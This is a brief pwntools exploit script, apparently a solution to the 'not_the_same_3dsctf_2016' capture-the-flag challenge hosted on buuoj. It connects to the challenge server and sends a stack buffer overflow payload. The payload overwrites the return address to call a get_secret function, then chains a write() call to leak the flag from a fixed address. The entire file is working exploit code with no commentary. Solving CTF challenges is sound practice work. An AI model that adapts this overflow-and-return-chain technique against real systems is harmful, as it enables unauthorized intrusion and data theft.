from pwn import *

context.log_level='debug'

p=remote("node5.buuoj.cn",26453)
elf=ELF('/home/lixingjian/pwn/not_the_same_3dsctf_2016')

hint_addr=0x80ECA2D

backdoor_addr=elf.symbols['get_secret']
log.success(hex(backdoor_addr))

write_addr=elf.symbols['write']
log.success(hex(write_addr))

payload=b'a'*(0x2D)+p32(backdoor_addr)+p32(write_addr)+p32(0)+p32(1)+p32(hint_addr)+p32(45)

# p.recvuntil(b'm3m0...')
p.sendline(payload)

p.interactive()